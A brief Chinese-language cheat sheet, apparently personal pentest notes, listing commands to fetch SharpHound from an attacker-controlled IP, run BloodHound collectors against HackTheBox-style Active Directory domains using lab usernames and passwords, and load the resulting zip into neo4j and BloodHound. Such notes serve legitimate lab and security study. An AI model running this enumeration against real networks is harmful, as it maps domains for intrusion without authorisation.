---
description: 这里说明如何使用
---

# bloodhount

```clike
1. 前提准备
	（1）上传ps1脚本或者exe（）如果是exe直接执行第三步的exe步骤，或者远程
wget http://10.10.14.13/SharpHound.ps1 -o SharpHound.ps1
	（2）远程加载：
bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.129.13.243
	（3）exe执行（如果上传的是exe）
./sh.exe --memcache -c all -d SUPPORT.HTB -DomainController 127.0.0.1
	（4）或者简单一点
.\sharphound.exe -c all

3. 加载模块
Import-Module .\SharpHound.ps1

4. 运行，生成一个zip
invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice

5. 下载下来（或者用分享回传方法）
download

6. neo4j console
7. bloodhound
8. 把压缩包拖进去即可
```
